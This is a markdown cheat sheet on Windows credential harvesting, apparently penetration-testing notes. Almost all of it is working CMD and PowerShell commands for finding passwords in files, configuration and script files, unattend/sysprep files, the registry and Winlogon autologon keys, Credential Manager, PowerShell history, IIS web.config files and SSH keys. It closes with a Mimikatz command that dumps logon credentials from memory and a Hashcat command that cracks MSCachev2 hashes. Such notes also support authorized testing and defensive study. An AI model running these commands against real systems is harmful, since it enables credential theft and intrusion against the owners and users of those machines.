# Index
- [[ Windows Credential Harvesting ]]

# Find Files Containing Passwords

Sensitive information like passwords may be stored in files across the file system. Below are commands to search for such files.

#### Searching for Files Containing Passwords

- **CMD:** Search for files containing "password" in the file name:
    ```cmd
    dir C:\*password* /s /p > C:\Path\To\Outfile.txt
    ```

- **PowerShell:** Search the file system for files containing "password" in the name or content:
    ```powershell
    Get-ChildItem -Path C:\ -Recurse -Include *password* -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Out-File "C:\Path\To\Outfile.txt"
    ```

# Search for Configuration Files Containing Credentials

Configuration files often store sensitive data like usernames and passwords. The following commands can help you locate such files.

#### Searching for Configuration Files with Credentials

- **CMD:** Search configuration files for the string "password":
    ```cmd
    findstr /s /i "password" *.config *.xml *.ini > C:\Path\To\Outfile.txt
    ```

- **PowerShell:** Search for common configuration file types (`.config`, `.xml`, `.ini`) that may contain credentials:
    ```powershell
    Get-ChildItem -Path C:\ -Recurse -Include *.config,*.xml,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Out-File "C:\Path\To\Outfile.txt"
    ```

#### Examining System Files for Credentials
- Check for Plaintext Passwords in Configuration Files:
	Inspect specific files (such as configuration files) for the occurrence of passwords in plaintext.
	```powershell
	Get-Content C:\Path\To\Config\File.txt | Select-String -Pattern "password" | Out-File "C:\Path\To\Outfile.txt"
	```

# Search for Credentials in Script Files

Credentials are sometimes hardcoded in scripts, which can be easily overlooked by administrators. The following commands search through common script file types.

#### Searching for Hardcoded Credentials in Scripts

- **CMD:** Search for "password" in `.ps1`, `.bat`, or `.sh` script files:
    ```cmd
    findstr /s /i "password" *.ps1 *.bat *.sh > C:\Path\To\Outfile.txt
    ```

- **PowerShell:** Search for "password" in `.ps1`, `.bat`, or `.sh` script files:
    ```powershell
    Get-ChildItem -Path C:\ -Recurse -Include *.ps1,*.bat,*.sh -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|pwd" | Out-File "C:\Path\To\Outfile.txt"
    ```

# Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
	- `C:\Unattend.xml`
	- `C:\Windows\Panther\Unattend.xml`
	- `C:\Windows\Panther\Unattend\Unattend.xml`
	- `C:\Windows\system32\sysprep.inf`
	- `C:\Windows\system32\sysprep\sysprep.xml`

#### Searching for Unattended Installation Files

- **CMD:** Search for unattended installation files:
    ```cmd
    dir /s /p C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\system32\sysprep.inf C:\Windows\system32\sysprep\sysprep.xml > C:\Path\To\Outfile.txt
    ```

- **PowerShell:** Search for unattended installation files that may contain passwords:
    ```powershell
    Get-ChildItem -Path C:\Windows -Recurse -Include *unattend*.xml,*sysprep*.xml -ErrorAction SilentlyContinue | Select-String -Pattern "password|Administrator" | Out-File "C:\Path\To\Outfile.txt"
    ```

# Search for Cleartext Credentials in the Windows Registry

Some applications store passwords in the Windows Registry. These entries can be queried and inspected.

#### Searching the Registry for Passwords

- **CMD:** Search the registry for keys containing "password":
    ```cmd
    reg query HKCU /s | findstr /i "password" > C:\Path\To\Outfile.txt
    ```

- **PowerShell:** Search the registry for keys or values that contain "password":
    ```powershell
    Get-ChildItem -Path HKCU:\ -Recurse | Get-ItemProperty | Where-Object { $_.PSObject.Properties.Name -match "password" } | Out-File "C:\Path\To\Outfile.txt"
    ```

# Cached Plaintext Credentials (Winlogon)

Windows systems may have cached credentials in the `Winlogon` registry key for auto-login functionality. This key often contains default usernames and passwords.

#### Checking for Cached Credentials in Winlogon

- **CMD:** Query the `Winlogon` registry key for cached credentials:
    ```cmd
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"
    ```

# Saved Windows Credentials

Windows allows users to save credentials for ease of access. You can query these saved credentials using the following commands.

#### Listing Saved Credentials

- **CMD:** List saved credentials:
    ```cmd
    cmdkey /list
    ```

- **CMD:** Use VaultCmd to list credentials stored in the Windows Credential Manager:
    ```cmd
    vaultcmd /list
    ```

# PowerShell History

Commands run in PowerShell are stored in a history file, which can sometimes contain sensitive information if commands including passwords were executed.

#### Retrieving PowerShell Command History

- **CMD:** Read the PowerShell command history:
    ```cmd
    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    ```

# IIS Configuration Files

Internet Information Services (IIS) stores its configuration in `web.config` files, which may contain database connection strings or other sensitive information like passwords.

#### Searching for Sensitive Information in IIS Config Files

- **CMD:** Search for connection strings in `web.config` files:
    ```cmd
    findstr /s /i "connectionString" C:\inetpub\wwwroot\web.config > C:\Path\To\Outfile.txt
    ```

- **PowerShell:** Search for sensitive information in `web.config` files:
    ```powershell
    Get-ChildItem -Path C:\inetpub\wwwroot\ -Recurse -Include web.config | Select-String -Pattern "connectionString|password" | Out-File "C:\Path\To\Outfile.txt"
    ```

# Searching for SSH Keys

SSH keys like `id_rsa` and `id_dsa` can grant unauthorized access to servers. Searching for these files can help identify potential vulnerabilities.

#### Searching for SSH Keys

- **CMD:** Search for SSH keys:
    ```cmd
    dir /s /p *id_rsa* *id_dsa* > C:\Path\To\Outfile.txt
    ```

- **PowerShell:** Search for SSH private keys:
    ```powershell
    Get-ChildItem -Path C:\ -Recurse -Include *id_rsa*,*id_dsa* -ErrorAction SilentlyContinue
    ```

# Credential Dumping Tools

External tools like **Mimikatz** can be used to extract credentials from memory, including plaintext passwords, NTLM hashes, and Kerberos tickets.

#### Using Mimikatz to Dump Credentials

- **CMD:** Run Mimikatz to dump credentials:
    ```cmd
    mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" exit
    ```

#### Cracking MSCachev2 Hashes

MSCachev2 hashes from cached domain credentials can be cracked using **Hashcat**.

- **Hashcat:** Crack `MSCachev2` hashes:
    ```bash
    hashcat -m 2100 <hashes_file> <password_list>
    ```